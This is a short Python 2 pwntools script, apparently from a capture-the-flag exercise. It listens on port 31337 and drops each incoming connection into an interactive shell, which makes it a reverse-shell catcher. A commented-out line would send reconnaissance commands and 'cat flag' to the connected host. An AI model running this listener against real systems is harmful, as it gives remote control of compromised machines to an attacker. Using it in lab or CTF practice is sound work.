#!python

from socket import *
from pwn import *
context('i386', 'linux', 'ipv4')

HOST = ''
PORT = 31337

s = socket(AF_INET, SOCK_STREAM)
s.bind( (HOST, PORT) )
s.listen(10)

log.info('Ready to accept a client')
while 1:
    conn, addr = s.accept()
    print 'Connected with ' + addr[0] + ':' + str(addr[1])
    #conn.send('id;uname -a;ifconfig -a;cat flag\n')
    ShellWithSocket(conn)

s.close()
